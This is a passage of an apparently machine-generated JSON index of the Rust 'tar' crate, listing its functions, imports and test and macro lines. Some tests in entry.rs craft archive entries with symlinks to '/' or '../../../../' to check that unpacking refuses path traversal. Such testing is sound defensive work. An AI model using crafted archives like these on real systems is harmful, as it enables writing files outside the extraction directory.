          "assert!(s[0x3000 + 5..0x5000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x5000..0x5000 + 5], \"text\\n\");",
          "assert!(s[0x5000 + 5..0x7000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x7000..0x7000 + 5], \"text\\n\");",
          "assert!(s[0x7000 + 5..0x9000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x9000..0x9000 + 5], \"text\\n\");",
          "assert!(s[0x9000 + 5..0xb000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0xb000..0xb000 + 5], \"text\\n\");",
          "t!(t!(File::open(td.path().join(\"sparse.txt\"))).read_to_string(&mut s));",
          "assert!(s[..0x1000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x1000..0x1000 + 6], \"hello\\n\");",
          "assert!(s[0x1000 + 6..0x2fa0].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x2fa0..0x2fa0 + 6], \"world\\n\");",
          "assert!(s[0x2fa0 + 6..0x4000].chars().all(|x| x == '\\u{0}'));",
          "let rdr = Cursor::new(tar!(\"sparse-large.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let a = t!(entries.next().unwrap());",
          "assert_eq!(h.real_size().unwrap(), 12626929280);",
          "let rdr = Cursor::new(tar!(\"sparse-1.tar\"));",
          "let mut entries = t!(ar.entries());",
          "let mut a = t!(entries.next().unwrap());",
          "t!(a.read_to_string(&mut s));",
          "assert_eq!(0x100_00c, s.len());",
          "assert_eq!(&s[..0xc], \"0MB through\\n\");",
          "assert!(s[0xc..0x100_000].chars().all(|x| x == '\\u{0}'));",
          "assert_eq!(&s[0x100_000..], \"1MB through\\n\");",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let mut file = t!(File::create(&path));",
          "t!(file.set_len(",
          "t!(file.seek(io::SeekFrom::Start(off)));",
          "t!(file.write_all(&data));",
          "t!(ar.append_path_with_name(&path, path.file_name().unwrap()));",
          "t!(ar.finish());",
          "let data = t!(ar.into_inner());",
          "assert!(data.len() <= 37 * 1024); // ext4 (defaults to 4k block size)",
          "assert!(data.len() <= 273 * 1024); // UFS (defaults to 32k block size, last bloc",
          "let mut entries = t!(ar.entries());",
          "let mut f = t!(entries.next().unwrap());",
          "t!(f.read_to_string(&mut s));",
          "let expected = t!(fs::read_to_string(&path));",
          "assert!(s == expected, \"path: {path:?}\");",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "t!(header.set_path(&short_path));",
          "assert_eq!(t!(header.path()), short_path);",
          "assert!(!header.path_bytes().contains(&b'\\\\'));",
          "t!(header.set_path(&long_path));",
          "assert_eq!(t!(header.path()), long_path);",
          "assert!(!header.path_bytes().contains(&b'\\\\'));",
          "t!(ar.append_file(&short_path, &mut t!(File::open(&path))));",
          "t!(ar.append_file(&long_path, &mut t!(File::open(&path))));",
          "let rd = Cursor::new(t!(ar.into_inner()));",
          "let mut entries = t!(ar.entries());",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), short_path);",
          "assert!(!entry.path_bytes().contains(&b'\\\\'));",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), long_path);",
          "assert!(!entry.path_bytes().contains(&b'\\\\'));",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(env::set_current_dir(td.path()));",
          "t!(symlink(\"testdest\", \"test\"));",
          "t!(ar.append_path(\"test\"));",
          "t!(symlink(&long_linkname, \"test2\"));",
          "t!(ar.append_path(\"test2\"));",
          "t!(symlink(&long_linkname, &long_pathname));",
          "t!(ar.append_path(&long_pathname));",
          "let rd = Cursor::new(t!(ar.into_inner()));",
          "let mut entries = t!(ar.entries());",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), Path::new(\"test\"));",
          "assert_eq!(",
          "t!(entry.link_name()),",
          "assert_eq!(t!(entry.header().size()), 0);",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), Path::new(\"test2\"));",
          "assert_eq!(",
          "t!(entry.link_name()),",
          "assert_eq!(t!(entry.header().size()), 0);",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), Path::new(&long_pathname));",
          "assert_eq!(",
          "t!(entry.link_name()),",
          "assert_eq!(t!(entry.header().size()), 0);",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(h.set_path(\"././@LongLink\"));",
          "t!(ar.append(&h, \"foo\\0\".as_bytes()));",
          "t!(header.set_path(\"testdir/\"));",
          "t!(ar.append(&header, &mut io::empty()));",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "t!(ar.unpack(td.path()));",
          "assert!(t!(ar.entries()).all(|fr| fr.is_ok()));",
          "assert!(td.path().join(\"foo\").is_file());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(fs::create_dir(&path));",
          "t!(t!(File::create(&path)).write_all(b\"test\"));",
          "let rd = Cursor::new(t!(ar.into_inner()));",
          "let mut entries = t!(ar.entries());",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), Path::new(\"archive/dir\"));",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(t!(entry.path()), Path::new(\"archive/dir/f\"));",
          "assert!(entries.next().is_none());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let dummy_src = t!(TempBuilder::new().prefix(\"dummy_src\").tempdir());",
          "t!(symlink(dummy_src.path().display().to_string(), &dummy_dst));",
          "assert!(dummy_dst.read_link().is_ok());",
          "assert!(dummy_dst.read_link().unwrap().is_dir());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let rdr = Cursor::new(tar!(\"7z_long_path.tar\"));",
          "assert!(ar.unpack(td.path()).is_ok());",
          "let really_long_path = format!(\"{}{}\", dir_name, dir_name);",
          "let td = t!(TempBuilder::new().prefix(&really_long_path).tempdir());",
          "let rdr = Cursor::new(tar!(\"7z_long_path.tar\"));",
          "assert!(ar.unpack(td.path()).is_ok());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(h.set_path(\"dir/\"));",
          "t!(b.append(&h, \"\".as_bytes()));",
          "t!(h.set_path(\"dir/file\"));",
          "t!(b.append(&h, \"hi\".as_bytes()));",
          "let contents = t!(b.into_inner());",
          "assert!(ar.unpack(td.path()).is_ok());",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "let fifo_path = t!(CString::new(fifo.to_str().unwrap()));",
          "panic!(\"Failed to create a FIFO file\");",
          "t!(env::set_current_dir(td.path()));",
          "t!(ar.append_path(\"fifo\"));",
          "t!(ar.append_dir_all(\"special\", td.path()));",
          "t!(env::set_current_dir(\"/dev/\"));",
          "t!(ar.append_path(\"null\"));",
          "t!(ar.finish());",
          "let result = t!(ar.into_inner());",
          "assert!(",
          "let result = t!(ar.into_inner());",
          "assert!(",
          "t!(header.set_path(\"iamuid580800000\"));",
          "t!(ar.append(&header, data));",
          "t!(header.set_path(\"iamuid580800001\"));",
          "t!(ar.append(&header, data));",
          "t!(header.set_path(\"iamuid580800002\"));",
          "t!(ar.append(&header, data));",
          "t!(header.set_path(\"iamuid580800002dir\"));",
          "t!(ar.append(&header, data));",
          "t!(header.set_path(\"iamuid580800000symlink\"));",
          "t!(ar.append_link(&mut header, \"iamuid580800000symlink\", \"iamuid580800000\"));",
          "t!(ar.finish());",
          "let rdr = Cursor::new(t!(ar.into_inner()));",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "assert_eq!(meta.uid(), 580800000);",
          "assert_eq!(meta.gid(), 580800000);",
          "assert_eq!(meta.uid(), 580800001);",
          "assert_eq!(meta.gid(), 580800000);",
          "assert_eq!(meta.uid(), 580800002);",
          "assert_eq!(meta.gid(), 580800002);",
          "assert_eq!(meta.uid(), 580800002);",
          "assert_eq!(meta.gid(), 580800002);",
          "assert_eq!(meta.uid(), 580800002);",
          "assert_eq!(meta.gid(), 580800002)",
          "assert!(ar.unpack(td.path()).is_err());",
          "let tarlist = [tar!(\"biguid_gnu.tar\"), tar!(\"biguid_pax.tar\")];",
          "let td = t!(TempBuilder::new().prefix(\"tar-rs\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "assert_eq!(uid, 4294967294);",
          "assert_eq!(gid, 4294967294);",
          "assert!(ar.unpack(td.path()).is_err());"
        ],
        "derives": [],
        "error_handling": 125
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/tests/entry.rs",
        "function_defs": [
          "fn absolute_symlink() {",
          "fn absolute_hardlink() {",
          "fn relative_hardlink() {",
          "fn absolute_link_deref_error() {",
          "fn relative_link_deref_error() {",
          "fn directory_maintains_permissions() {",
          "fn set_entry_mask() {",
          "fn modify_link_just_created() {",
          "fn modify_outside_with_relative_symlink() {",
          "fn parent_paths_error() {",
          "fn good_parent_paths_ok() {",
          "fn modify_hard_link_just_created() {",
          "fn modify_symlink_just_created() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs::create_dir;",
          "use std::fs::File;",
          "use std::io::Read;",
          "use tempfile::Builder;",
          "use ::std::os::unix::fs::PermissionsExt;",
          "use ::std::os::unix::fs::PermissionsExt;",
          "use std::path::PathBuf;"
        ],
        "macros": [
          "Err(e) => panic!(\"{} returned {}\", stringify!($e), e),",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "t!(td.path().join(\"foo\").symlink_metadata());",
          "let mut entries = t!(ar.entries());",
          "let entry = t!(entries.next().unwrap());",
          "assert_eq!(&*entry.link_name_bytes().unwrap(), b\"/bar\");",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"bar\"));",
          "t!(header.set_link_name(td.path().join(\"foo\")));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "t!(ar.unpack(td.path()));",
          "t!(td.path().join(\"foo\").metadata());",
          "t!(td.path().join(\"bar\").metadata());",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"bar\"));",
          "t!(header.set_link_name(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "t!(td.path().join(\"foo\").metadata());",
          "t!(td.path().join(\"bar\").metadata());",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"/\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "assert!(ar.unpack(td.path()).is_err());",
          "t!(td.path().join(\"foo\").symlink_metadata());",
          "assert!(File::open(td.path().join(\"foo\").join(\"bar\")).is_err());",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"../../../../\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "assert!(ar.unpack(td.path()).is_err());",
          "t!(td.path().join(\"foo\").symlink_metadata());",
          "assert!(File::open(td.path().join(\"foo\").join(\"bar\")).is_err());",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "let f = t!(File::open(td.path().join(\"foo\")));",
          "let md = t!(f.metadata());",
          "assert!(md.is_dir());",
          "assert_eq!(md.permissions().mode(), 0o40777);",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "let mut entries = t!(ar.entries());",
          "let mut foo = t!(entries.next().unwrap());",
          "t!(foo.unpack(&foo_path));",
          "let f = t!(File::open(foo_path));",
          "let md = t!(f.metadata());",
          "assert!(md.is_file());",
          "assert_eq!(md.permissions().mode(), 0o100750);",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"bar/foo\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "t!(File::open(td.path().join(\"bar/foo\")));",
          "t!(File::open(td.path().join(\"bar/bar\")));",
          "t!(File::open(td.path().join(\"foo/foo\")));",
          "t!(File::open(td.path().join(\"foo/bar\")));",
          "t!(header.set_path(\"symlink\"));",
          "t!(header.set_link_name(\"..\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"symlink/foo/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "assert!(ar.unpack(tar_dir).is_err());",
          "assert!(!td.path().join(\"foo\").exists());",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"..\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo/bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "assert!(ar.unpack(td.path()).is_err());",
          "t!(td.path().join(\"foo\").symlink_metadata());",
          "assert!(File::open(td.path().join(\"foo\").join(\"bar\")).is_err());",
          "t!(header.set_path(PathBuf::from(\"foo\").join(\"bar\")));",
          "t!(header.set_link_name(PathBuf::from(\"..\").join(\"bar\")));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"bar\"));",
          "t!(ar.append(&header, &[][..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(ar.unpack(td.path()));",
          "t!(td.path().join(\"foo\").join(\"bar\").read_link());",
          "let dst = t!(td.path().join(\"foo\").join(\"bar\").canonicalize());",
          "t!(File::open(dst));",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"../test\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &b\"x\"[..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(File::create(&test));",
          "assert!(ar.unpack(&dir).is_err());",
          "t!(t!(File::open(&test)).read_to_end(&mut contents));",
          "assert_eq!(contents.len(), 0);",
          "t!(header.set_path(\"foo\"));",
          "t!(header.set_link_name(\"../test\"));",
          "t!(ar.append(&header, &[][..]));",
          "t!(header.set_path(\"foo\"));",
          "t!(ar.append(&header, &b\"x\"[..]));",
          "let bytes = t!(ar.into_inner());",
          "let td = t!(Builder::new().prefix(\"tar\").tempdir());",
          "t!(File::create(&test));",
          "t!(ar.unpack(&dir));",
          "t!(t!(File::open(&test)).read_to_end(&mut contents));",
          "assert_eq!(contents.len(), 0);"
        ],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/examples/raw_list.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::stdin;",
          "use tar::Archive;"
        ],
        "macros": [
          "println!(\"-------------------------- Entry {}\", i);",
          "println!(\"path: {}\", f.path().unwrap().display());",
          "println!(\"size: {}\", f.header().size().unwrap());",
          "println!(\"entry size: {}\", f.header().entry_size().unwrap());",
          "println!(\"link name: {:?}\", f.link_name().unwrap());",
          "println!(\"file type: {:#x}\", f.header().entry_type().as_byte());",
          "println!(\"mode: {:#o}\", f.header().mode().unwrap());",
          "println!(\"uid: {}\", f.header().uid().unwrap());",
          "println!(\"gid: {}\", f.header().gid().unwrap());",
          "println!(\"mtime: {}\", f.header().mtime().unwrap());",
          "println!(\"username: {:?}\", f.header().username().unwrap());",
          "println!(\"groupname: {:?}\", f.header().groupname().unwrap());",
          "println!(\"kind: UStar\");",
          "println!(\"kind: GNU\");",
          "println!(\"kind: normal\");",
          "println!(\"pax extensions:\");",
          "println!("
        ],
        "derives": [],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/examples/list.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::stdin;",
          "use tar::Archive;"
        ],
        "macros": [
          "println!(\"{}\", f.path().unwrap().display());"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/examples/write.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fs::File;",
          "use tar::Builder;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/examples/extract_file.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::env::args_os;",
          "use std::io::{copy, stdin, stdout};",
          "use std::path::Path;",
          "use tar::Archive;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/entry_type.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [
          "impl EntryType {"
        ],
        "uses": [],
        "macros": [],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Eq, Debug)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/error.rs",
        "function_defs": [
          "fn description(&self) -> &str {",
          "fn source(&self) -> Option<&(dyn error::Error + 'static)> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(t: TarError) -> Error {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl TarError {",
          "impl error::Error for TarError {",
          "impl fmt::Display for TarError {",
          "impl From<TarError> for Error {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::error;",
          "use std::fmt;",
          "use std::io::{self, Error};"
        ],
        "macros": [],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/lib.rs",
        "function_defs": [
          "fn other(msg: &str) -> Error {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io::{Error, ErrorKind};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/header.rs",
        "function_defs": [
          "fn is_ustar(&self) -> bool {",
          "fn is_gnu(&self) -> bool {",
          "fn path_lossy(&self) -> String {",
          "fn set_path_inner(&mut self, path: &Path, is_truncated_gnu_long_path: bool) -> io::Result<()> {",
          "fn _set_link_name(&mut self, path: &Path) -> io::Result<()> {",
          "fn _set_link_name_literal(&mut self, bytes: &[u8]) -> io::Result<()> {",
          "fn calculate_cksum(&self) -> u32 {",
          "fn fill_from(&mut self, meta: &fs::Metadata, mode: HeaderMode) {",
          "fn fill_platform_from(&mut self, meta: &fs::Metadata, mode: HeaderMode) {",
          "fn fill_platform_from(&mut self, meta: &fs::Metadata, mode: HeaderMode) {",
          "fn entry_type(mode: u32) -> EntryType {",
          "fn fill_platform_from(&mut self, meta: &fs::Metadata, mode: HeaderMode) {",
          "fn debug_fields(&self, b: &mut fmt::DebugStruct) {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn clone(&self) -> Header {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn path_lossy(&self) -> String {",
          "fn _set_path(&mut self, path: &Path) -> io::Result<()> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fullname_lossy(&self) -> String {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn default() -> Self {",
          "fn octal_from(slice: &[u8]) -> io::Result<u64> {",
          "fn octal_into<T: fmt::Octal>(dst: &mut [u8], val: T) {",
          "fn num_field_wrapper_into(dst: &mut [u8], src: u64) {",
          "fn num_field_wrapper_from(src: &[u8]) -> io::Result<u64> {",
          "fn numeric_extended_into(dst: &mut [u8], src: u64) {",
          "fn numeric_extended_from(src: &[u8]) -> u64 {",
          "fn truncate(slice: &[u8]) -> &[u8] {",
          "fn copy_into(slot: &mut [u8], bytes: &[u8]) -> io::Result<()> {",
          "fn copy_path_into_inner(",
          "fn copy(slot: &mut &mut [u8], bytes: &[u8]) -> io::Result<()> {",
          "fn copy_path_into(slot: &mut [u8], path: &Path, is_link_name: bool) -> io::Result<()> {",
          "fn copy_path_into_gnu_long(slot: &mut [u8], path: &Path, is_link_name: bool) -> io::Result<()> {",
          "fn ends_with_slash(p: &Path) -> bool {",
          "fn ends_with_slash(p: &Path) -> bool {",
          "fn ends_with_slash(p: &Path) -> bool {",
          "fn not_unicode(v: &[u8]) -> io::Error {",
          "fn invalid_utf8<T>(_: T) -> io::Error {"
        ],
        "struct_defs": [
          "struct DebugAsOctal<T>(T);",
          "struct DebugSparseHeaders<'a>(&'a [GnuSparseHeader]);"
        ],
        "impl_blocks": [
          "impl Header {",
          "impl Clone for Header {",
          "impl fmt::Debug for Header {",
          "impl OldHeader {",
          "impl fmt::Debug for OldHeader {",
          "impl UstarHeader {",
          "impl fmt::Debug for UstarHeader {",
          "impl GnuHeader {",
          "impl fmt::Debug for GnuHeader {",
          "impl GnuSparseHeader {",
          "impl fmt::Debug for GnuSparseHeader {",
          "impl GnuExtSparseHeader {",
          "impl Default for GnuExtSparseHeader {"
        ],
        "uses": [
          "use std::os::unix::prelude::*;",
          "use std::os::windows::prelude::*;",
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use std::fs;",
          "use std::io;",
          "use std::iter;",
          "use std::iter::{once, repeat};",
          "use std::mem;",
          "use std::path::{Component, Path, PathBuf};",
          "use std::str;",
          "use crate::other;",
          "use crate::EntryType;",
          "use std::ffi::{OsStr, OsString};"
        ],
        "macros": [
          "assert_eq!(bytes.len(), mem::size_of::<Header>());",
          "assert_eq!(mem::align_of_val(bytes), mem::align_of::<Header>());",
          "format!(\"{} when getting size for {}\", err, self.path_lossy()),",
          "format!(\"{} when setting path for {}\", err, self.path_lossy()),",
          "format!(\"{} when setting link name for {}\", err, self.path_lossy()),",
          "format!(\"{} when getting mode for {}\", err, self.path_lossy()),",
          "format!(\"{} when getting uid for {}\", err, self.path_lossy()),",
          "format!(\"{} when getting gid for {}\", err, self.path_lossy()),",
          "format!(\"{} when getting mtime for {}\", err, self.path_lossy()),",
          "format!(\"{} when getting cksum for {}\", err, self.path_lossy()),",
          "unimplemented!();",
          "assert_eq!(mem::size_of_val(a), mem::size_of::<U>());",
          "assert_eq!(mem::align_of_val(a), mem::align_of::<U>());",
          "assert_eq!(mem::size_of_val(a), mem::size_of::<U>());",
          "assert_eq!(mem::align_of_val(a), mem::align_of::<U>());",
          "format!(\"{} when setting path for {}\", err, self.path_lossy()),",
          "return Err(other(&format!(",
          "format!(\"{} when setting path for {}\", err, self.path_lossy()),",
          "format!(\"{} when setting path for {}\", err, self.path_lossy()),",
          "format!(\"{} when setting username for {}\", err, self.path_lossy()),",
          "format!(\"{} when setting groupname for {}\", err, self.path_lossy()),",
          "format!(",
          "format!(",
          "format!(",
          "format!(",
          "format!(",
          "format!(",
          "format!(",
          "format!(\"{} when getting atime for {}\", err, self.fullname_lossy()),",
          "format!(\"{} when getting ctime for {}\", err, self.fullname_lossy()),",
          "format!(",
          "format!(\"{} when getting offset from sparse header\", err),",
          "format!(\"{} when getting length from sparse header\", err),",
          "debug_assert_eq!(mem::size_of_val(self), BLOCK_SIZE as usize);",
          "debug_assert_eq!(mem::size_of_val(self), BLOCK_SIZE as usize);",
          "return Err(other(&format!(",
          "Err(_) => Err(other(&format!(\"numeric field was not a number: {}\", num))),",
          "let o = format!(\"{:o}\", val);",
          ".ok_or_else(|| other(&format!(\"path {} was not valid Unicode\", p.display())))",
          "other(&format!("
        ],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Eq, Debug)]"
        ],
        "error_handling": 30
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/entry.rs",
        "function_defs": [
          "fn read(&mut self, into: &mut [u8]) -> io::Result<usize> {",
          "fn path(&self) -> io::Result<Cow<Path>> {",
          "fn path_bytes(&self) -> Cow<[u8]> {",
          "fn path_lossy(&self) -> String {",
          "fn link_name(&self) -> io::Result<Option<Cow<Path>>> {",
          "fn link_name_bytes(&self) -> Option<Cow<[u8]>> {",
          "fn pax_extensions(&mut self) -> io::Result<Option<PaxExtensions>> {",
          "fn unpack_in(&mut self, dst: &Path) -> io::Result<bool> {",
          "fn unpack_dir(&mut self, dst: &Path) -> io::Result<()> {",
          "fn unpack(&mut self, target_base: Option<&Path>, dst: &Path) -> io::Result<Unpacked> {",
          "fn set_perms_ownerships(",
          "fn get_mtime(header: &Header) -> Option<FileTime> {",
          "fn symlink(src: &Path, dst: &Path) -> io::Result<()> {",
          "fn symlink(src: &Path, dst: &Path) -> io::Result<()> {",
          "fn symlink(src: &Path, dst: &Path) -> io::Result<()> {",
          "fn open(dst: &Path) -> io::Result<std::fs::File> {",
          "fn set_ownerships(",
          "fn _set_ownerships(",
          "fn _set_ownerships(",
          "fn set_perms(",
          "fn _set_perms(",
          "fn _set_perms(",
          "fn _set_perms(",
          "fn set_xattrs(me: &mut EntryFields, dst: &Path) -> io::Result<()> {",
          "fn set_xattrs(_: &mut EntryFields, _: &Path) -> io::Result<()> {",
          "fn ensure_dir_created(&self, dst: &Path, dir: &Path) -> io::Result<()> {",
          "fn validate_inside_dst(&self, dst: &Path, file_dst: &Path) -> io::Result<PathBuf> {",
          "fn read(&mut self, into: &mut [u8]) -> io::Result<usize> {",
          "fn read(&mut self, into: &mut [u8]) -> io::Result<usize> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::borrow::Cow;",
          "use std::cmp;",
          "use std::fs;",
          "use std::fs::OpenOptions;",
          "use std::io::prelude::*;",
          "use std::io::{self, Error, ErrorKind, SeekFrom};",
          "use std::marker;",
          "use std::path::{Component, Path, PathBuf};",
          "use filetime::{self, FileTime};",
          "use crate::archive::ArchiveInner;",
          "use crate::error::TarError;",
          "use crate::header::bytes2path;",
          "use crate::other;",
          "use crate::{Archive, Header, PaxExtensions};",
          "use std::os::unix::prelude::*;",
          "use std::os::unix::prelude::*;",
          "use std::ffi::OsStr;",
          "use std::os::unix::prelude::*;"
        ],
        "macros": [
          "///     file.unpack(format!(\"file-{}\", i)).unwrap();",
          "format!(\"invalid path in entry header: {}\", self.path_lossy()),",
          ".map_err(|e| TarError::new(format!(\"failed to create `{}`\", parent.display()), e",
          ".map_err(|e| TarError::new(format!(\"failed to unpack `{}`\", file_dst.display()),",
          "format!(\"{} when creating dir {}\", err, dst.display()),",
          "return Err(other(&format!(",
          "return Err(other(&format!(",
          "format!(",
          "format!(",
          "TarError::new(format!(\"failed to set mtime for `{}`\", dst.display()), e)",
          "format!(",
          "TarError::new(format!(\"failed to set mtime for `{}`\", dst.display()), e)",
          "format!(",
          "io::Error::new(io::ErrorKind::Other, format!(\"UID {} is too large!\", uid))",
          "io::Error::new(io::ErrorKind::Other, format!(\"GID {} is too large!\", gid))",
          "format!(\"path contains null character: {:?}\", e),",
          "format!(",
          "format!(",
          "format!(\"{} while canonicalizing {}\", err, file_dst.display()),",
          "format!(\"{} while canonicalizing {}\", err, dst.display()),",
          "format!("
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 62
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/src/archive.rs",
        "function_defs": [
          "fn _entries<'a>(",
